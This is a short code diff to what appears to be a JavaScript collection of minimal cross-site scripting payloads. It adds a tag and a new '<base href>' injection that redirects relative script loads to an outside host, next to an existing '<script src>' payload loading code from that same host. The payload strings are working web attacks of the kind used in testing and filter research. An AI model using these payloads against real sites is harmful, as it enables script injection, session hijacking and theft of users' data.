@@ -15,10 +15,16 @@ const TAGS = {
     chromeOnly: 'chrome-only',
     safariOnly: 'safari-only',
     firefoxInner: 'firefox-innerHTML',
-    chromeInner: 'chrome-innerHTML'
+    chromeInner: 'chrome-innerHTML',
+    requiresRelativeScript: 'requires-relative-script-after-injection'
 }
 
 const PAYLOADS = [
+    {
+        html: '<base/href=//Ǌ.₨>',
+        tags: [TAGS.requiresRelativeScript, TAGS.scripts],
+        author: null,
+    },
     {
         html: '<script/src=//Ǌ.₨><\/script>',
         tags: [TAGS.scripts, TAGS.notInner],
